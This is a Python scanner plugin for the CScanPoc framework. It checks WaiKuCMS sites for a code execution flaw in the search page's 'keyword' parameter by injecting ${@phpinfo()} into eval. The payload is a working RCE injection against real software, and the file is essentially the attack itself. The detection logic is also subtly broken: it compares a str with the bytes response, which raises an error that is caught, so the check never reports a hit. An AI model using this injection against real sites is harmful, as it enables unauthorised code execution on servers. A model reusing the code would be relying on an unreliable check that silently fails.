# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WaiKuCMS_0101'  # 平台漏洞编号，留空
    name = 'WaiKuCMS /index.php/Search.html 代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-10-11'  # 漏洞公布时间
    desc = '''
        歪酷CMS基于Thinkphp框架开发,是一款小巧的CMS内容管理系统。
        Search.html 参数 keyword会在一定条件下会带入eval函数，构造代码可造成代码执行。
    '''  # 漏洞描述
    ref = 'http://www.wooyun.org/bugs/wooyun-2010-048523'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WaiKuCMS(歪酷CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e3c0c7d-3dcf-4467-8c88-544a6cf6022d'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            vul_url = self.target+'/index.php/search.html?keyword=%24%7B%40phpinfo%28%29%7D'
            response = urllib.request.urlopen(
                urllib.request.Request(vul_url)).read()
            if '<title>phpinfo()</title>' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
